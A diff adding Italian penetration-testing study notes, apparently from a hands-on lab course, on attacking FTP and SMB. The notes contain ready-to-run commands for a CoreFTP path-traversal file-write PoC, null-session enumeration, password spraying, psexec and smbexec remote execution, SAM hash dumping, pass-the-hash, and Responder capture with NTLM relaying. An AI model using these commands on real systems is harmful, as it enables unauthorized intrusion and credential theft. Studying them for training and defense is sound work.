@@ -120,11 +120,131 @@ per usare le GUI dobbiamo installare
 
 ## FTP Bounce attack
 
-Un attacco FTP Bounce permette ad un attaccante di utilizzare un server FTP esposto all' esterno per interagire con la rete interna.
+Un attacco FTP Bounce permette ad un attaccante di utilizzare un server FTP esposto all' esterno per interagire con la rete interna usando il comando **PORT**.
 
 `nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2` 
 
 Con questo comando possiamo fare una nmap scan di una macchina in rete interna.
 
+## Latest FTP VUlnerabilities
 
 
+### CoreFTP before build 727 CVE-2022-22836
+
+E' una vuln che ci permette (da autenticati) di fare ath traversal e fare arbitrary file write (quindi se c'e' tipo un server web possiamo caricare una web shell)
+
+### Exploitation
+`j4k1dibe@htb[/htb]$ curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops`
+
+# Attacking SMB
+
+SMB Gira in porta 139 TCP e porta 137 e 138 UDP.
+
+Inizialmente ra fatto per girare sopra NetBIOS in TCP , ma dopo Microsoft ha agigunto opzione di runnarlo diretto su porta 445 senza il layer di NetBIOS.
+Comunque anche i sistemi moderni supportano SMB over NetBIOS come implementazione di resilienza.
+
+Altro protoccoli correlato a SMB e' MSRPC, RPC da ai developer un metodo per eseguire procedure remoto in locale o remoto senza dover capire i protocolli di rete.
+
+## Enumeration
+`j4k1dibe@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445`
+
+## Misconfigurations
+SMB puo' essere configurata per non richiedere autenticazione. TIpicamente e' detta **null session**. 
+
+### Anonymous authentication
+Se troviamo un server SMB che non ha bisogno di credenziali possiamo avere una lista di share, username, gruppi, permessi etc.etc.
+
+Per farlo usiamo tool come **smbclient, smbmap, rpcclient, or enum4linux**.
+
+### Enumero File Share con smbclient
+`j4k1dibe@htb[/htb]$ smbclient -N -L //10.129.14.128`, **-L** signific lista le share. **-N** significa usa la null session.
+
+### Enumero file share con smbmap
+`j4k1dibe@htb[/htb]$ smbmap -H 10.129.14.128`
+
+`j4k1dibe@htb[/htb]$ smbmap -H 10.129.14.128 -r notes` con la flag **-r** (recursive) posso ispezionare una share e i permessi
+
+`j4k1dibe@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"` con la flag **--download** scarico un file da una share
+
+`j4k1dibe@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"` con la flag **--upload** carico un file in una share.
+
+## RPC
+
+Possiamo usare rpcclient con una null session per enumerare workstation o domain controller
+
+il tool **rpcclient** ci offre molti comandi per eseguire funzioni specifiche su server SMB. (extension://bfdogplmndidlpjfhoijckpakkdjkkil/pdf/viewer.html?file=https%3A%2F%2Fwww.willhackforsushi.com%2Fsec504%2FSMB-Access-from-Linux.pdf CHEAT SHEET)
+
+```
+j4k1dibe@htb[/htb]$ rpcclient -U'%' 10.10.110.17
+
+rpcclient $> enumdomusers
+
+user:[mhope] rid:[0x641]
+user:[svc-ata] rid:[0xa2b]
+user:[svc-bexec] rid:[0xa2c]
+user:[roleary] rid:[0xa36]
+user:[smorgan] rid:[0xa37]
+```
+
+### Enum4linux
+E; un altro tool che utilizza altri tool per automatizzare enumerazione di target SMB
+
+`j4k1dibe@htb[/htb]$ ./enum4linux-ng.py 10.10.11.45 -A -C`
+
+## Protocol Specific attacks
+
+Se non e' abilitato una null session dobbiamo avere le credenziali. possiamo provare **brute forcing** e **Password Spray**.
+
+
+### Password spray con crackmapexec
+`j4k1dibe@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth`, se si vuole trovare altri login dopo averne trovato uno bisogna usare la flag **--continue-on-success**
+
+## RCE
+
+Se riusciamo ad avere delle credenziali possiamo riuscire a prendere una RCE tramite **PsExec**
+
+`j4k1dibe@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17` RCE com Impacket-psexec
+
+`j4k1dibe@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec` rce con crackmapexec
+
+
+## Enumerating logged-on users
+`j4k1dibe@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users`
+
+## Extract hashes from SAM database
+`j4k1dibe@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam`
+
+## Pass-The-Hash
+
+Se riusciamo a prendere un hash NTLM di un utente e non riusciamo a craccarlo possiamo autenticarci su SMB tramite Pass-The-Hash.
+
+`j4k1dibe@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE`
+
+## Forced Authentication Attacks
+
+Possiamo abusare di SMB creando un falso erver SMB per catturare le **NetNTLM v1/v2 hash**
+
+Per farlo dovremo usare il tool **Responder** e dovremo aspettare delle richieste al DNS locale.
+
+`j4k1dibe@htb[/htb]$ responder -I <interface name>`
+
+tutti gli hash intercettati stanno nella log directory: `/usr/share/responder/logs/`
+
+Per crackare gli hash:
+
+`j4k1dibe@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`
+
+
+
+The NTLMv2 hash was cracked. The password is P@ssword. If we cannot crack the hash, we can potentially relay the captured hash to another machine using impacket-ntlmrelayx or Responder MultiRelay.py. Let us see an example using impacket-ntlmrelayx.
+
+First, we need to set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf).
+
+```
+j4k1dibe@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='
+
+SMB = Off
+```
+Then we execute impacket-ntlmrelayx with the option --no-http-server, -smb2support, and the target machine with the option -t. By default, impacket-ntlmrelayx will dump the SAM database, but we can execute commands by adding the option -c.
+
+`j4k1dibe@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146`
